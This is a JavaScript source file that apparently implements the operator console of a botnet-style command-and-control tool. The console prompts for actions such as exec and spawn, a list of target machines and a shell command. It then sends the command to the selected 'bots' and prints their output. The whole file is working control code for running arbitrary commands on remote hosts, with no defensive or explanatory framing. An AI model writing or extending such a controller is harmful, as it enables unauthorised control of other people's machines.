const prompt = require('prompt');
const Component = require('./utils/Component');
const Command = require('../shared/Command');



class Cli extends Component{
	constructor(){
		super();
		this.actions = ['who','exec','spawn','exit'];
		this.defaultTimeout = 60;
		prompt.start();
		prompt.message = '';
		prompt.delimiter = '';
		this.doLoop();
		this.bots = [];

	}
	getCommand(){
		return new Promise((resolve,reject)=>{
			prompt.get({
				name: 'command',
				description: 'Enter a command to run on selected targets.',
				type:'string',
				required:true,
				message:'A command is required.',
			},(err,res)=>{
				if(err) reject(err);
				resolve(res.command);
			});
		});
	}
	getAction(){
		return new Promise((resolve,reject)=>{
			prompt.get({
				name: 'action',
				description: 'Enter an action.',
				type:'string',
				required:true,
				message:`Must be one of ${this.actions.join(', ')}.`,
				conform:(action)=>{
					return this.actions.includes(action);
				}

			},(err,res)=>{
				if(err) reject(err);
				resolve(res.action);
			});
		});
	}
	getTarget(){
		return new Promise((resolve,reject)=>{
			prompt.get({
				name: 'target',
				description: 'Comma delmited list of targets.',
				type:'string',
			},(err,res)=>{
				if(err) reject(err);
				resolve(res.target);
			});
		});
	}
	async doLoop(){
		const action = await this.getAction().catch(e=>{
			process.exit();
		});
		if(action === 'exit') process.exit();
		console.log(this.bots);
		let target = await this.getTarget().catch(e=>{
			process.exit();
		});
		if(target) target = target.split(',');
		let payload = undefined;
		if(action === 'exec' || action === 'spawn'){
			payload = await this.getCommand().catch(e=>{
				process.exit();
			});
		}
		const command = new Command(action,this.receiver.id,payload,Date.now(),target,this.defaultTimeout);
		command.id = command.generateId();
		this.receiver.communicator.sendCommand(command);
		await this.doLoop();
	}
	async getInput(options){
		prompt.get(options,()=>{});
	}
	notify(response){
		this.bots.push(response.issuer);
		console.log(response.issuer);
		if(response.output.stdout) console.log(response.output.stdout);
		if(response.output.stderr) console.error(response.output.stderr);
	}

}

module.exports =  new Cli();
